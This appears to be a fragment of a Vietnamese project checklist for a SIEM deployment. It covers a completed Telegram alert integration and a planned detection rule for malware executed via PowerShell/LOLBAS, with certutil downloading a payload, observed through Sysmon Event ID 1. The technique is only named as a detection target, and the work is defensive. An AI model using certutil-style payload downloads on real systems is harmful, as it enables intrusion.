+- [x] Triển khai **Telegram ChatOps**: Viết `integrations/telegram/custom-telegram.py` (hỗ trợ SSL fallback), cấu hình `<integration>` trong `ossec.conf`, kiểm thử bắn cảnh báo thật tự động qua Rule 100001, 100002, 87105.
 
 ### Giai đoạn 2: Mở rộng Kịch bản (3-5 ngày)
 - [ ] Triển khai **Kịch bản 3**: Bắt hành vi thực thi mã độc qua PowerShell / LOLBAS (`certutil` download payload) sử dụng telemetry của **Sysmon Event ID 1**. Viết rule `100003` và bổ sung test case tương ứng.
